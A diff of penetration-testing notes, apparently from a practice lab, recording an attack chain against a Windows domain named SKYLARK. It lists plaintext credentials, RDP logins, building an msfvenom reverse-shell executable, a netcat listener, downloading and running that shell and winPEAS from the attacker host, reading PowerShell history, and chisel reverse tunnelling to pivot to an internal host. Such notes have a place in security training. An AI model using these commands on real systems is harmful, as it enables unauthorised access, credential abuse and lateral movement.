@@ -64,10 +64,40 @@ feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/Common-PHP-File
 # login to webserver on https://192.168.248.221/RDWeb with creds from the pdf on 225
 SKYLARK\kiosk - XEwUS^9R2Gwt8O914
 
-xfreerdp cpub-SkylarkStatus-QuickSessionCollection-CmsRdsh.rdp /u:kiosk /p:XEwUS^9R2Gwt8O914 /d:SKYLARK /v:192.168.248.221
+# use this command for initial access. Click on 'austin02' link, then open cmd.exe from the filesystem
+xfreerdp cpub-SkylarkStatus-QuickSessionCollection-CmsRdsh.rdp /u:kiosk /p:XEwUS^9R2Gwt8O914 /d:SKYLARK /v:192.168.186.221
 
-xfreerdp /u:kiosk /p:XEwUS^9R2Gwt8O914 /d:SKYLARK /v:192.168.248.221
+xfreerdp /u:kiosk /p:XEwUS^9R2Gwt8O914 /d:SKYLARK /v:192.168.186.221
 
+# get a better shell
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.217 LPORT=9999 -f exe -o shell.exe
+nc -nvlp 9999
+iwr -uri http://192.168.45.217:8000/shell.exe -Outfile shell.exe
+.\shell.exe
+
+```
+
+.221 privesc
+```
+iwr -uri http://192.168.45.217/winPEASx64.exe -Outfile winPEAS.exe
+.\winPEAS.exe
+
+# findings
+type C:\Users\kiosk\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+kiosk has a .ssh directory
+
+# find that we have an internal interface with some ports running on it
+ipconfig /all
+netstat -ano
+10.10.76.254:139
+10.10.76.254:40000
+10.10.76.254:57215 
+
+chisel server --port 80 --reverse
+sudo tcpdump -nvvvXi tun0 tcp port 8081
+iwr -uri http://192.168.45.217/chisel.exe -Outfile chisel.exe
+
+.\chisel.exe client 192.168.45.217:80 R:40000:10.10.76.254:40000
 ```
 
 .222
